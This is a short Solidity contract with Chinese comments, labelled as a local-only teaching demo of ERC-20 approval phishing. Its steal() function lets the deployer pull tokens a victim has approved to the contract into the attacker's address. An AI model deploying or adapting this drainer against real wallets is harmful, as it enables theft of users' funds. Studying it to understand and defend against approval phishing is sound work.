// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title 攻击原理演示合约
 * @notice 仅用于本地学习：展示攻击者如何利用 approve 盗取资金
 * @dev 永远不要部署到主网！
 */
contract PhishingDemo {
    address public attacker;
    
    constructor() {
        attacker = msg.sender;
    }
    
    // 攻击者调用：转走 victim 对本合约的授权资金
    function steal(IERC20 token, address victim, uint256 amount) external {
        require(msg.sender == attacker, "Not attacker");
        token.transferFrom(victim, attacker, amount);
    }
}
